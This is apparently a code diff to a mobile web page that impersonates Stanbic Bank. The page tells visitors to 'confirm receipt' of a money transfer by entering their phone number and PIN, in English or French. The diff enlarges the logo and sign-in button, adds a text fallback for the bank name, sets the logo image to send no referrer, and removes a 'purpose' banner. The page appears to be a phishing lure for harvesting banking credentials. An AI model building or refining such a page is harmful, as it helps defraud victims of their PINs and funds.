@@ -21,7 +21,6 @@
     --sb-page:      #EEF1F7;
     --sb-green:     #0E7A4A;
     --sb-red:       #B3261E;
-    --sb-red-soft:  #FDECEA;
     --input-border: rgba(255,255,255,0.35);
     --input-border-focus: rgba(255,255,255,0.85);
     --muted: rgba(255,255,255,0.68);
@@ -48,15 +47,26 @@
     background: var(--sb-gold); z-index: 2;
   }
 
-  /* ─── TOP BRAND ─── */
+  /* ═══ TOP BRAND — logo + text, both visible ═══ */
   .brand-block {
     text-align: center; padding: 40px 24px 0;
-    display: flex; flex-direction: column; align-items: center; gap: 18px;
+    display: flex; flex-direction: column; align-items: center; gap: 20px;
+  }
+  .brand-logo-wrap {
+    display: flex; align-items: center; justify-content: center; gap: 10px;
+    min-height: 48px;
   }
   .brand-logo {
-    height: 40px; width: auto; display: block;
-    filter: brightness(0) invert(1);
-    opacity: 0.96;
+    height: 48px; width: auto; display: block;
+  }
+  .brand-name-text {
+    font-size: 26px; font-weight: 800; letter-spacing: -0.6px;
+    color: var(--sb-white); line-height: 1; white-space: nowrap;
+  }
+  .brand-name-text .dot { color: var(--sb-gold); }
+
+  .brand-titles {
+    display: flex; flex-direction: column; gap: 4px;
   }
   .brand-title {
     font-size: 18px; font-weight: 700; color: var(--sb-white);
@@ -64,32 +74,12 @@
   }
   .brand-sub {
     font-size: 12.5px; color: var(--muted); font-weight: 500;
-    margin-top: 4px; letter-spacing: 0.2px;
+    letter-spacing: 0.2px;
   }
 
-  /* ─── PURPOSE CARD (top) ─── */
-  .purpose-banner {
-    margin: 20px 24px 0;
-    padding: 12px 16px;
-    background: rgba(255,255,255,0.10);
-    border: 1px solid rgba(255,255,255,0.18);
-    border-radius: 10px;
-    display: flex; flex-direction: column; gap: 3px;
-    text-align: left;
-  }
-  .purpose-banner.hidden { display: none; }
-  .purpose-banner .plabel {
-    font-size: 10px; font-weight: 700; letter-spacing: 0.7px;
-    text-transform: uppercase; color: var(--sb-gold);
-  }
-  .purpose-banner .pvalue {
-    font-size: 13px; font-weight: 600; color: #fff;
-    line-height: 1.4; word-break: break-word;
-  }
-
-  /* ─── AMOUNT ─── */
+  /* ═══ AMOUNT ═══ */
   .amount-line {
-    text-align: center; padding: 20px 24px 0;
+    text-align: center; padding: 24px 24px 0;
     display: flex; flex-direction: column; gap: 4px;
   }
   .amount-line .alabel {
@@ -97,13 +87,13 @@
     text-transform: uppercase; color: var(--muted);
   }
   .amount-line .aval {
-    font-size: 26px; font-weight: 800; letter-spacing: -0.6px;
+    font-size: 28px; font-weight: 800; letter-spacing: -0.6px;
     color: var(--sb-white); line-height: 1.2;
   }
 
-  /* ─── FORM ─── */
+  /* ═══ FORM ═══ */
   .form-area {
-    flex: 1; padding: 24px 30px 20px;
+    flex: 1; padding: 28px 30px 20px;
     display: flex; flex-direction: column;
   }
   .field { margin-bottom: 22px; position: relative; }
@@ -158,14 +148,17 @@
   .status-banner.show { display: block; }
   .status-banner.error { background: rgba(179,38,30,0.20); color: #FFE04D; border: 1px solid rgba(255,224,77,0.35); }
 
+  /* BIG BUTTON */
   .btn-signin {
-    width: 100%; height: 54px;
+    width: 100%; min-height: 64px;
     background: var(--sb-white); color: var(--sb-primary);
-    font-family: inherit; font-size: 15px; font-weight: 800;
-    letter-spacing: 1.4px; text-transform: uppercase;
-    border: none; border-radius: 10px; cursor: pointer; margin-top: 8px;
+    font-family: inherit; font-size: 17px; font-weight: 800;
+    letter-spacing: 0.4px;
+    border: none; border-radius: 12px; cursor: pointer; margin-top: 12px;
     box-shadow: 0 10px 24px rgba(0, 0, 0, 0.22);
     transition: filter .15s, transform .1s;
+    display: flex; align-items: center; justify-content: center;
+    padding: 18px 24px;
   }
   .btn-signin:hover { filter: brightness(0.98); }
   .btn-signin:active { transform: scale(0.985); }
@@ -198,7 +191,7 @@
     color: var(--muted);
   }
 
-  /* ─── INITIATING ─── */
+  /* ═══ INITIATING ═══ */
   .initiating {
     position: fixed; inset: 0;
     background: linear-gradient(160deg, var(--sb-primary) 0%, var(--sb-royal) 100%);
@@ -209,15 +202,15 @@
   }
   .initiating.show { display: flex; }
   .initiating .brand-row {
-    display: flex; align-items: center; gap: 10px;
+    display: flex; align-items: center; justify-content: center; gap: 10px;
     margin-bottom: 40px;
   }
-  .initiating .brand-row img {
-    height: 30px; filter: brightness(0) invert(1); opacity: 0.95;
-  }
+  .initiating .brand-row img { height: 32px; width: auto; }
   .initiating .brand-row .mini-text {
-    font-size: 14px; font-weight: 700; color: var(--sb-white);
+    font-size: 20px; font-weight: 800; color: var(--sb-white);
+    letter-spacing: -0.5px;
   }
+  .initiating .brand-row .mini-text .dot { color: var(--sb-gold); }
   .initiating h2 {
     font-size: 20px; font-weight: 800; letter-spacing: -0.3px;
     margin-bottom: 8px;
@@ -258,17 +251,17 @@
   }
   .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
 
-  /* ─── RESPONSIVE ─── */
+  /* ═══ RESPONSIVE ═══ */
   @media (pointer: coarse) {
     .pin-input-wrap input, .phone-input-wrap input { font-size: 17px; }
-    .btn-signin { height: 56px; font-size: 15px; }
+    .btn-signin { min-height: 66px; font-size: 17px; }
     .phone-input-wrap, .pin-input-wrap { padding-bottom: 10px; }
   }
   @media (orientation: landscape) and (max-height: 500px) {
-    .brand-block { padding: 16px 24px 0; gap: 10px; }
-    .brand-logo { height: 30px; }
+    .brand-block { padding: 16px 24px 0; gap: 12px; }
+    .brand-logo { height: 36px; }
+    .brand-name-text { font-size: 20px; }
     .brand-title { font-size: 15px; }
-    .purpose-banner { margin: 12px 24px 0; padding: 8px 12px; }
     .amount-line { padding: 12px 24px 0; }
     .amount-line .aval { font-size: 20px; }
     .form-area { padding: 12px 26px 12px; }
@@ -278,24 +271,25 @@
     .contact-btn { width: 38px; height: 38px; }
     .contact-btn svg { width: 18px; height: 18px; }
     .contact-label { font-size: 11px; }
-    .btn-signin { height: 46px; }
+    .btn-signin { min-height: 52px; font-size: 15px; }
   }
   @media (max-width: 380px) {
     .brand-block { padding-top: 30px; }
-    .brand-logo { height: 34px; }
+    .brand-logo { height: 40px; }
+    .brand-name-text { font-size: 22px; }
     .brand-title { font-size: 16px; }
-    .purpose-banner { margin: 16px 20px 0; padding: 10px 14px; }
-    .amount-line { padding-top: 16px; }
-    .amount-line .aval { font-size: 22px; }
+    .amount-line { padding-top: 20px; }
+    .amount-line .aval { font-size: 24px; }
     .form-area { padding: 22px 22px 16px; }
-    .btn-signin { height: 50px; font-size: 14px; }
+    .btn-signin { min-height: 60px; font-size: 16px; }
     .contact-btn { width: 46px; height: 46px; }
     .contact-btn svg { width: 20px; height: 20px; }
     .initiating h2 { font-size: 18px; }
     .spinner { width: 46px; height: 46px; }
   }
   @media (max-height: 680px) {
-    .brand-block { padding-top: 24px; gap: 12px; }
+    .brand-block { padding-top: 24px; gap: 14px; }
+    .brand-logo { height: 40px; }
     .form-area { padding-top: 18px; }
     .field { margin-bottom: 16px; }
     .terms { padding-top: 16px; }
@@ -316,20 +310,20 @@
 <div class="phone">
 
   <div class="brand-block">
-    <img
-      class="brand-logo"
-      src="https://cdn.brandfetch.io/idrjWN3IVw/w/582/h/164/theme/dark/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
-      alt="Stanbic Bank"
-    >
-    <div>
+    <div class="brand-logo-wrap">
+      <img
+        class="brand-logo"
+        src="https://cdn.brandfetch.io/idrjWN3IVw/w/582/h/164/theme/dark/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
+        alt="Stanbic Bank"
+        referrerpolicy="no-referrer"
+        onerror="this.style.display='none'"
+      >
+      <span class="brand-name-text">Stanbic<span class="dot">.</span></span>
+    </div>
+    <div class="brand-titles">
       <div class="brand-title" id="brandTitle">Confirm your receipt</div>
       <div class="brand-sub" id="brandSub">Sign in to continue</div>
     </div>
-  </div>
-
-  <div class="purpose-banner hidden" id="purposeBanner">
-    <span class="plabel" id="purposeLabel">Purpose</span>
-    <span class="pvalue" id="purposeValue">—</span>
   </div>
 
   <div class="amount-line">
@@ -390,7 +384,10 @@
     <img
       src="https://cdn.brandfetch.io/idrjWN3IVw/w/582/h/164/theme/dark/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
       alt="Stanbic Bank"
+      referrerpolicy="no-referrer"
+      onerror="this.style.display='none'"
     >
+    <span class="mini-text">Stanbic<span class="dot">.</span></span>
   </div>
 
   <div class="spinner"></div>
@@ -411,7 +408,6 @@
       brandTitle: 'Confirm your receipt',
       brandSubFallback: 'Sign in to continue',
       brandSubCountry: 'Confirm to receive your transfer',
-      purposeLabel: 'Purpose',
       amountLabel: 'Amount',
       phoneLabel: 'Phone number',
       phonePlaceholder: 'Enter phone number',
@@ -437,7 +433,6 @@
       brandTitle: 'Confirmez votre reçu',
       brandSubFallback: 'Connectez-vous pour continuer',
       brandSubCountry: 'Confirmez pour recevoir votre virement',
-      purposeLabel: 'Motif',
       amountLabel: 'Montant',
       phoneLabel: 'Numéro de téléphone',
       phonePlaceholder: 'Entrez le numéro de téléphone',
@@ -521,32 +516,22 @@
 
   function applyTranslations() {
     document.title = T.docTitle;
-
     document.getElementById('brandTitle').textContent = T.brandTitle;
-    document.getElementById('purposeLabel').textContent = T.purposeLabel;
     document.getElementById('amountLabel').textContent = T.amountLabel;
-
     document.getElementById('phoneLabel').textContent = T.phoneLabel;
     document.getElementById('phoneInput').placeholder = T.phonePlaceholder;
     document.getElementById('phoneError').textContent = T.phoneError;
-
     document.getElementById('pinLabel').textContent = T.pinLabel;
     document.getElementById('pinError').textContent = T.pinError;
-
     document.getElementById('signinBtn').textContent = T.signIn;
-
     document.getElementById('termsBlock').childNodes[0].nodeValue = T.termsText + ' ';
     document.getElementById('termsLink').textContent = T.termsLink;
-
     document.getElementById('contactLabel').textContent = T.contactLabel;
-
     document.getElementById('initiatingTitle').textContent = T.initiatingTitle;
     document.getElementById('initiatingDesc').textContent = T.initiatingDesc;
     document.getElementById('initiatingNote').textContent = T.initiatingNote;
     document.getElementById('cancelBtn').textContent = T.cancel;
-
     applyBrandSub();
-    applyPurpose();
     applyAmount();
   }
 
@@ -556,17 +541,6 @@
       subEl.textContent = T.brandSubCountry;
     } else {
       subEl.textContent = T.brandSubFallback;
-    }
-  }
-
-  function applyPurpose() {
-    const banner = document.getElementById('purposeBanner');
-    const value = document.getElementById('purposeValue');
-    if (tx.pu && tx.pu.trim()) {
-      value.textContent = tx.pu.trim();
-      banner.classList.remove('hidden');
-    } else {
-      banner.classList.add('hidden');
     }
   }
 
